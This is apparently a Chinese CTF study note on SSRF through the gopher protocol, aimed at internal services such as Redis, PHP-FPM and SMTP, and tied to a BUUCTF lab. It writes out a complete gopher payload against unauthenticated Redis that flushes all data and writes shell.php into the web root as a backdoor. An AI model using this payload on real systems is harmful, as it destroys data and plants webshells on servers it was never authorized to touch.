---
title: 【WEB】ssrf gopher协议
---
# Gopher 协议

在 http 出现之前，访问网页需要输入的是 

gopher://gopher.baidu.com/ 

而不是

https://www.baidu.com/

而它被代替的原因一方面是收费，另一方面的原因是它固化的结构没有HTML网页灵活

利用 gopher 的方式有 FTP 爆破，REDIS，MYSQL，FAST CGI，XXE



## 一些常用服务

Redis	6379

FPM	  9000

Smtp	 25

Mysql	3306

常用的协议

dict 、gopher

以下为经典的 Redis 未授权访问，以及常用 payload 的生成



## 利用方式

比如常见的，web 有一个 curl 的功能，然后可以访问内网靶机，就可以用类似的方式进行命令传递

( payload 每经过一次传递就会被解码一次 )

redis

![3](/images/ssrf-gopher/3.png)

Smtp 生成 payload

![1](/images/ssrf-gopher/1.png)

Fpm 生成 payload

![2](/images/ssrf-gopher/2.png)

gopher支持多行。因此要在传输的数据前加一个无用字符。比如 gopher://ip:port/_ 通常用 _ 并不是只能用 _ ，gopher协议会吃掉第一个字符



## 关于 redis

redis 的格式：每一个 *number 代表每一行命令，number 代表每行命令中数组中的元素个数。$number 代表每个元素的长度。

URL解码后可以看到创建 shell 的完整流程

```gopher://127.0.0.1:6379/_*1
$8							//元素长度为8
flushall
*3							//3个元素
$3
set
$1
1
$31

<?php echo "hello world" ?>

*4
$6
config
$3
set
$3
dir
$13
/var/www/html
*4
$6
config
$3
set
$10
dbfilename
$9
shell.php
*1
$4
save
```

即为redis将输入的语句保存在指定位置的php文件中，生成后门



## 相关环境：

BUUCTF[GKCTF_EZWEB]